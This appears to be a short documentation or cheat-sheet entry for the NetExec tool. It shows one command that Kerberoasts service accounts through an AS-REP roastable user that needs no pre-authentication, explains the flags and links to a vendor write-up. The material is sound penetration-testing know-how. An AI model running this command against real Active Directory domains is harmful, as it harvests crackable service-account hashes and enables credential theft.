> Kerberoasting by leveraging an AS-REP roastable account that does not require pre-authentication. This is possible by combining `--no-preauth-targets` and `--kerberoasting`.

```bash
nxc ldap 192.168.0.104 -u harry -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
```

`-u`: AS-REP roastable user (no pre-auth required).
`--no-preauth-targets`: Single user or file containing list of users to target with Kerberoasting.

all explained [here](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
